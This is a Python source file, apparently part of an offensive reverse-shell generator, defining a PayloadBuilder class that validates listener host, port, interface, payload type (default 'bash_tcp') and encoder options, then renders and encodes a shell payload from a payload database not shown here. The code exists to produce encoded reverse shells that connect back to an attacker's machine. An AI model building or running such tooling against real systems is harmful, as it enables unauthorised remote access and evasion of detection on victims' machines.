from typing import Optional

from core import utils
from modules.encoders import Encoders
from modules.payloads import PayloadDatabase


class PayloadBuilder:
    def __init__(self):
        self.LHOST: Optional[str] = None
        self.LPORT: Optional[int] = None
        self.INTERFACE: Optional[str] = None
        self.PAYLOAD_TYPE: str = 'bash_tcp'
        self.ENCODER: str = 'none'

    def set_option(self, key: str, value: str) -> bool:
        key_upper = key.upper()

        if key_upper == 'LHOST':
            if not utils.is_valid_ip(value):
                return False
            self.LHOST = value
            self.INTERFACE = None
            return True

        if key_upper == 'LPORT':
            if not utils.is_valid_port(value):
                return False
            self.LPORT = int(value)
            return True

        if key_upper == 'INTERFACE':
            interfaces = utils.get_network_interfaces()
            if value not in interfaces:
                return False
            self.INTERFACE = value
            self.LHOST = interfaces[value]
            return True

        if key_upper == 'PAYLOAD':
            if value not in PayloadDatabase.get_all_keys():
                return False
            self.PAYLOAD_TYPE = value
            return True

        if key_upper == 'ENCODER':
            if value.lower() not in Encoders.SUPPORTED:
                return False
            self.ENCODER = value.lower()
            return True

        return False

    def _resolve_lhost(self) -> Optional[str]:
        if self.LHOST:
            return self.LHOST
        ifaces = utils.get_network_interfaces()
        if self.INTERFACE:
            return ifaces.get(self.INTERFACE)
        for iface, ip in ifaces.items():
            if not ip.startswith('127.'):
                self.INTERFACE = iface
                self.LHOST = ip
                return ip
        fallback = next(iter(ifaces.values()), None)
        if fallback:
            self.LHOST = fallback
        return fallback

    def _resolve_lport(self) -> int:
        if self.LPORT:
            return self.LPORT
        return utils.get_random_port()

    def get_options(self) -> dict:
        return {
            'LHOST': self._resolve_lhost() or '(not set)',
            'LPORT': str(self._resolve_lport()),
            'INTERFACE': self.INTERFACE or '(not set)',
            'PAYLOAD': self.PAYLOAD_TYPE,
            'ENCODER': self.ENCODER,
        }

    def generate(self) -> str:
        lhost = self._resolve_lhost()
        lport = self._resolve_lport()
        if not self.LPORT:
            self.LPORT = lport

        raw = PayloadDatabase.render(self.PAYLOAD_TYPE, lhost, lport)
        if raw is None:
            raise ValueError(f"Unknown payload type: {self.PAYLOAD_TYPE}")

        shell_type = self.PAYLOAD_TYPE.split('_')[0]
        return Encoders.smart_wrap(raw, self.ENCODER, shell_type)